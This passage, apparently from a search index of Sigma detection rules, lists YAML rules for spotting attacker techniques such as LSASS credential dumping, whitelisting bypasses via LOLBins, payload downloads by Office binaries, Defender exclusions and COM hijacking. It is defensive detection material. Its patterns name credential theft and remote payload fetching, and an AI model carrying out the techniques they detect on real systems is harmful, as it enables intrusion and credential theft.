fa47597e-90e9-41cd-ab72-c3b74cfb0d02 status: test description: Detect indirect command execution via Program Compatibility Assistant (pcalua.exe or forfiles.exe). author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md - https://eqllib.readthedocs.io/en/latest/analytics/884a7ccd-7305-4130-82d0-d4f90bc118b6.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\pcalua.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; condition: selection fields: - ComputerName - User - ParentCommandLine - CommandLine falsepositives: - Need to use extra processing with \u0026#39;unique_count\u0026#39; / \u0026#39;filter\u0026#39; to focus on outliers as opposed to commonly seen artifacts. - Legitimate usage of scripts. level: low tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_indirect_cmd.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Indirect Command Execution"},{"categories":null,"contents":"Detect an interactive AT job, which may be used as a form of privilege escalation.\nKnown false-positives Unlikely (at.exe deprecated as of Windows 8) References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html Raw rule (edit) title: Interactive AT Job id: 60fc936d-2eb0-4543-8a13-911c750a1dfc status: test description: Detect an interactive AT job, which may be used as a form of privilege escalation. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\at.exe\u0026#39; CommandLine|contains: \u0026#39;interactive\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unlikely (at.exe deprecated as of Windows 8) level: high tags: - attack.privilege_escalation - attack.t1053.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_interactive_at.yml/","tags":["attack.privilege_escalation","attack.t1053.002"],"title":"Interactive AT Job"},{"categories":null,"contents":"Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials.\nKnown false-positives Unlikely References https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md Raw rule (edit) title: LSASS Memory Dumping id: ffa6861c-4461-4f59-8a41-578c39f3f23e status: test description: Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html - https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;lsass\u0026#39; - \u0026#39;.dmp\u0026#39; selection2: Image|endswith: \u0026#39;\\werfault.exe\u0026#39; selection3: Image|contains: \u0026#39;\\procdump\u0026#39; Image|endswith: \u0026#39;.exe\u0026#39; CommandLine|contains: \u0026#39;lsass\u0026#39; condition: selection1 and not selection2 or selection3 fields: - ComputerName - User - CommandLine falsepositives: - Unlikely level: high tags: - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lsass_dump.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"LSASS Memory Dumping"},{"categories":null,"contents":"Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.md https://eqllib.readthedocs.io/en/latest/analytics/fd9b987a-1101-4ed3-bda6-a70300eaf57e.html Raw rule (edit) title: Modification of ld.so.preload id: 4b3cb710-5e83-4715-8c45-8b2b5b3e5751 status: test description: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.md - https://eqllib.readthedocs.io/en/latest/analytics/fd9b987a-1101-4ed3-bda6-a70300eaf57e.html date: 2019/10/24 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;PATH\u0026#39; name: \u0026#39;/etc/ld.so.preload\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1574.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_ld_so_preload_mod.yml/","tags":["attack.defense_evasion","attack.t1574.006"],"title":"Modification of ld.so.preload"},{"categories":null,"contents":"Identifies suspicious mshta.exe commands.\nKnown false-positives unknown References https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md Raw rule (edit) title: Mshta JavaScript Execution id: 67f113fa-e23d-4271-befa-30113b3e08b1 status: test description: Identifies suspicious mshta.exe commands. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\mshta.exe\u0026#39; CommandLine|contains: \u0026#39;javascript\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1218.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml/","tags":["attack.defense_evasion","attack.t1218.005"],"title":"Mshta JavaScript Execution"},{"categories":null,"contents":"Identifies creation of local users via the net.exe command.\nKnown false-positives Legitimate user creation. Better use event IDs for user creation rather than command line rules. References https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md Raw rule (edit) title: Net.exe User Account Creation id: cd219ff3-fa99-45d4-8380-a7d15116c6dc status: test description: Identifies creation of local users via the net.exe command. author: Endgame, JHasenbusch (adapted to Sigma for oscd.community) references: - https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md date: 2018/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains|all: - \u0026#39;user\u0026#39; - \u0026#39;add\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate user creation. - Better use event IDs for user creation rather than command line rules. level: medium tags: - attack.persistence - attack.t1136.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_net_user_add.yml/","tags":["attack.persistence","attack.t1136.001"],"title":"Net.exe User Account Creation"},{"categories":null,"contents":"Detect download by BITS jobs via PowerShell\nKnown false-positives Unknown References https://eqllib.readthedocs.io/en/latest/analytics/ec5180c9-721a-460f-bddc-27539a284273.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md Raw rule (edit) title: Suspicious Bitsadmin Job via PowerShell id: f67dbfce-93bc-440d-86ad-a95ae8858c90 status: test description: Detect download by BITS jobs via PowerShell author: Endgame, JHasenbusch (ported to sigma for oscd.community) references: - https://eqllib.readthedocs.io/en/latest/analytics/ec5180c9-721a-460f-bddc-27539a284273.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md date: 2018/10/30 modified: 2021/12/03 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: \u0026#39;Start-BitsTransfer\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.persistence - attack.t1197 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_bitsjob.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1197"],"title":"Suspicious Bitsadmin Job via PowerShell"},{"categories":null,"contents":"Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool.\nKnown false-positives Legitimate use of net.exe utility by legitimate user References https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md Raw rule (edit) title: Windows Network Enumeration id: 62510e69-616b-4078-b371-847da438cc03 status: stable description: Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool. references: - https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md author: Endgame, JHasenbusch (ported for oscd.community) date: 2018/10/30 modified: 2019/11/11 tags: - attack.discovery - attack.t1018 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains: \u0026#39;view\u0026#39; filter: CommandLine|contains: \\\\\\ condition: selection and not filter fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of net.exe utility by legitimate user level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_net_enum.yml/","tags":["attack.discovery","attack.t1018"],"title":"Windows Network Enumeration"},{"categories":null,"contents":"Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nKnown false-positives Admin activity References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md Raw rule (edit) title: System Owner or User Discovery id: 9a0d8ca0-2385-4020-b6c6-cb6153ca56f3 status: test description: Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0: - \u0026#39;users\u0026#39; - \u0026#39;w\u0026#39; - \u0026#39;who\u0026#39; condition: selection falsepositives: - Admin activity level: low tags: - attack.discovery - attack.t1033 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_user_discovery.yml/","tags":["attack.discovery","attack.t1033"],"title":"System Owner or User Discovery"},{"categories":null,"contents":"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nReferences https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md Raw rule (edit) title: Query Registry id: 970007b7-ce32-49d0-a4a4-fbef016950bd status: test description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\reg.exe\u0026#39; CommandLine|contains: - \u0026#39;query\u0026#39; - \u0026#39;save\u0026#39; - \u0026#39;export\u0026#39; selection_2: CommandLine|contains: - \u0026#39;currentVersion\\windows\u0026#39; - \u0026#39;currentVersion\\runServicesOnce\u0026#39; - \u0026#39;currentVersion\\runServices\u0026#39; - \u0026#39;winlogon\\\u0026#39; - \u0026#39;currentVersion\\shellServiceObjectDelayLoad\u0026#39; - \u0026#39;currentVersion\\runOnce\u0026#39; - \u0026#39;currentVersion\\runOnceEx\u0026#39; - \u0026#39;currentVersion\\run\u0026#39; - \u0026#39;currentVersion\\policies\\explorer\\run\u0026#39; - \u0026#39;currentcontrolset\\services\u0026#39; condition: selection_1 and selection_2 fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine level: low tags: - attack.discovery - attack.t1012 - attack.t1007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_query_registry.yml/","tags":["attack.discovery","attack.t1012","attack.t1007"],"title":"Query Registry"},{"categories":null,"contents":"Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment https://pentestlab.blog/2017/03/31/insecure-registry-permissions/ Raw rule (edit) title: Possible Privilege Escalation via Service Permissions Weakness id: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981 description: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level references: - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/ tags: - attack.privilege_escalation - attack.t1574.011 status: experimental author: Teymur Kheirkhabarov date: 2019/10/26 modified: 2021/09/15 logsource: product: windows category: process_creation detection: selection: IntegrityLevel: \u0026#39;Medium\u0026#39; CommandLine|contains|all: - ControlSet - services CommandLine|contains: - \\ImagePath - \\FailureCommand - \\ServiceDll condition: selection falsepositives: - Unknown level: high enrichment: - EN_0001_cache_sysmon_event_id_1_info # http://bit.ly/314zc6x - EN_0003_enrich_other_sysmon_events_with_event_id_1_data # http://bit.ly/2ojW7fw ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_possible_privilege_escalation_via_service_reg_perm.yml/","tags":["attack.privilege_escalation","attack.t1574.011"],"title":"Possible Privilege Escalation via Service Permissions Weakness"},{"categories":null,"contents":"Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment https://pentestlab.blog/2017/03/30/weak-service-permissions/ Raw rule (edit) title: Possible Privilege Escalation via Weak Service Permissions id: d937b75f-a665-4480-88a5-2f20e9f9b22a status: test description: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand author: Teymur Kheirkhabarov references: - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment - https://pentestlab.blog/2017/03/30/weak-service-permissions/ date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: scbynonadmin: Image|endswith: \u0026#39;\\sc.exe\u0026#39; IntegrityLevel: \u0026#39;Medium\u0026#39; binpath: CommandLine|contains|all: - \u0026#39;config\u0026#39; - \u0026#39;binPath\u0026#39; failurecommand: CommandLine|contains|all: - \u0026#39;failure\u0026#39; - \u0026#39;command\u0026#39; condition: scbynonadmin and (binpath or failurecommand) falsepositives: - Unknown level: high tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_using_sc_to_change_sevice_image_path_by_non_admin.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.t1574.011"],"title":"Possible Privilege Escalation via Weak Service Permissions"},{"categories":null,"contents":"Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://github.com/antonioCoco/RogueWinRM https://twitter.com/Cyb3rWard0g/status/1453123054243024897 Raw rule (edit) title: Suspicious Child Process Created as System id: 590a5f4c-6c8c-4f10-8307-89afe9453a9d status: test description: Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts author: Teymur Kheirkhabarov, Roberto Rodriguez (@Cyb3rWard0g), Open Threat Research (OTR) references: - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ - https://github.com/antonioCoco/RogueWinRM - https://twitter.com/Cyb3rWard0g/status/1453123054243024897 date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows definition: ParentUser field needs sysmon \u0026gt;= 13.30 detection: selection: ParentUser: - \u0026#39;NT AUTHORITY\\NETWORK SERVICE\u0026#39; - \u0026#39;NT AUTHORITY\\LOCAL SERVICE\u0026#39; - \u0026#39;AUTORITE NT\\\u0026#39; # French language settings User: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings IntegrityLevel: \u0026#39;System\u0026#39; rundllexception: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains: \u0026#39;DavSetCookie\u0026#39; condition: selection and not rundllexception falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1134.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_child_process_as_system_.yml/","tags":["attack.privilege_escalation","attack.t1134.002"],"title":"Suspicious Child Process Created as System"},{"categories":null,"contents":"Execute C# code located in the consoleapp folder\nKnown false-positives Legitimate use of dnx.exe by legitimate user References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/ Raw rule (edit) title: Application Whitelisting Bypass via Dnx.exe id: 81ebd28b-9607-4478-bf06-974ed9d53ed7 status: test description: Execute C# code located in the consoleapp folder author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/ date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\dnx.exe\u0026#39; condition: selection falsepositives: - Legitimate use of dnx.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218 - attack.t1027.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_dnx.yml/","tags":["attack.defense_evasion","attack.t1218","attack.t1027.004"],"title":"Application Whitelisting Bypass via Dnx.exe"},{"categories":null,"contents":"Launch 64-bit shellcode from a debugger script file using cdb.exe.\nKnown false-positives Legitimate use of debugging tools References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html Raw rule (edit) title: Possible App Whitelisting Bypass via WinDbg/CDB as a Shellcode Runner id: b5c7395f-e501-4a08-94d4-57fe7a9da9d2 status: test description: Launch 64-bit shellcode from a debugger script file using cdb.exe. author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml - http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cdb.exe\u0026#39; CommandLine|contains: \u0026#39;-cf\u0026#39; condition: selection falsepositives: - Legitimate use of debugging tools level: medium tags: - attack.execution - attack.t1106 - attack.defense_evasion - attack.t1218 - attack.t1127 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cdb.yml/","tags":["attack.execution","attack.t1106","attack.defense_evasion","attack.t1218","attack.t1127"],"title":"Possible App Whitelisting Bypass via WinDbg/CDB as a Shellcode Runner"},{"categories":null,"contents":"Detects scenarios where an windows defender exclusion was added in registry where an entity would want to bypass antivirus scanning from windows defender\nKnown false-positives Intended inclusions by administrator References https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/ Raw rule (edit) title: Windows Defender Exclusion Set id: e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d status: test description: \u0026#39;Detects scenarios where an windows defender exclusion was added in registry where an entity would want to bypass antivirus scanning from windows defender\u0026#39; author: \u0026#39;@BarryShooshooga\u0026#39; references: - https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/ date: 2019/10/26 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User\u0026#39; detection: selection: EventID: - 4657 - 4656 - 4660 - 4663 ObjectName|contains: \u0026#39;\\Microsoft\\Windows Defender\\Exclusions\\\u0026#39; condition: selection falsepositives: - Intended inclusions by administrator level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_defender_bypass.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Windows Defender Exclusion Set"},{"categories":null,"contents":"Execute VBscript code that is referenced within the *.bgi file.\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/ Raw rule (edit) title: Application Whitelisting Bypass via Bginfo id: aaf46cdc-934e-4284-b329-34aa701e3771 status: test description: Execute VBscript code that is referenced within the *.bgi file. author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/ date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\bginfo.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/popup\u0026#39; - \u0026#39;/nolicprompt\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.005 - attack.defense_evasion - attack.t1218 - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_bginfo.yml/","tags":["attack.execution","attack.t1059.005","attack.defense_evasion","attack.t1218","attack.t1202"],"title":"Application Whitelisting Bypass via Bginfo"},{"categories":null,"contents":"Detects execution of of Dxcap.exe\nKnown false-positives Legitimate execution of dxcap.exe by legitimate user References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml https://twitter.com/harr0ey/status/992008180904419328 Raw rule (edit) title: Application Whitelisting Bypass via Dxcap.exe id: 60f16a96-db70-42eb-8f76-16763e333590 status: test description: Detects execution of of Dxcap.exe author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml - https://twitter.com/harr0ey/status/992008180904419328 date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\dxcap.exe\u0026#39; CommandLine|contains|all: - \u0026#39;-c\u0026#39; - \u0026#39;.exe\u0026#39; condition: selection falsepositives: - Legitimate execution of dxcap.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_dxcap.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Application Whitelisting Bypass via Dxcap.exe"},{"categories":null,"contents":"Downloads payload from remote server\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 Reegun J (OCBC Bank) Raw rule (edit) title: Malicious Payload Download via Office Binaries id: 0c79148b-118e-472b-bdb7-9b57b444cc19 status: test description: Downloads payload from remote server author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 - Reegun J (OCBC Bank) date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; CommandLine|contains: \u0026#39;http\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_msoffice.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Malicious Payload Download via Office Binaries"},{"categories":null,"contents":"Detects defence evasion attempt via odbcconf.exe execution to load DLL\nKnown false-positives Legitimate use of odbcconf.exe by legitimate user References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml https://twitter.com/Hexacorn/status/1187143326673330176 Raw rule (edit) title: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe id: 65d2be45-8600-4042-b4c0-577a1ff8a60e status: test description: Detects defence evasion attempt via odbcconf.exe execution to load DLL author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml - https://twitter.com/Hexacorn/status/1187143326673330176 date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\odbcconf.exe\u0026#39; CommandLine|contains: - \u0026#39;-f\u0026#39; - \u0026#39;regsvr\u0026#39; selection_2: ParentImage|endswith: \u0026#39;\\odbcconf.exe\u0026#39; Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; condition: selection_1 or selection_2 falsepositives: - Legitimate use of odbcconf.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218.008 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_odbcconf.yml/","tags":["attack.defense_evasion","attack.t1218.008"],"title":"Application Whitelisting Bypass via DLL Loaded by odbcconf.exe"},{"categories":null,"contents":"Detects capture a network trace via netsh.exe trace functionality\nKnown false-positives Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason References https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/ Raw rule (edit) title: Capture a Network Trace with netsh.exe id: d3c3861d-c504-4c77-ba55-224ba82d0118 status: test description: Detects capture a network trace via netsh.exe trace functionality author: Kutepov Anton, oscd.community references: - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/ date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - netsh - trace - start condition: selection falsepositives: - Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_packet_capture.yml/","tags":["attack.discovery","attack.credential_access","attack.t1040"],"title":"Capture a Network Trace with netsh.exe"},{"categories":null,"contents":"Detects COM object hijacking via TreatAs subkey\nKnown false-positives Maybe some system utilities in rare cases use linking keys for backward compatibility References https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/ Raw rule (edit) title: Windows Registry Persistence COM Key Linking id: 9b0f8a61-91b2-464f-aceb-0527e0a45020 status: experimental description: Detects COM object hijacking via TreatAs subkey references: - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/ author: Kutepov Anton, oscd.community date: 2019/10/23 modified: 2021/09/17 logsource: category: registry_event product: windows detection: selection: EventType: \u0026#39;CreateKey\u0026#39; # don\u0026#39;t want DeleteKey events TargetObject|contains|all: - \u0026#39;HKU\\\u0026#39; - \u0026#39;Classes\\CLSID\\\u0026#39; - \u0026#39;\\TreatAs\u0026#39; condition: selection falsepositives: - Maybe some system utilities in rare cases use linking keys for backward compatibility level: medium tags: - attack.persistence - attack.t1546.015 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_persistence_key_linking.yml/","tags":["attack.persistence","attack.t1546.015"],"title":"Windows Registry Persistence COM Key Linking"},{"categories":null,"contents":"Detect changes in auditd configuration files\nKnown false-positives Legitimate administrative activity References https://github.com/Neo23x0/auditd/blob/master/audit.rules self experience Raw rule (edit) title: Auditing Configuration Changes on Linux Host id: 977ef627-4539-4875-adf4-ed8f780c4922 status: test description: Detect changes in auditd configuration files author: Mikhail Larin, oscd.community references: - 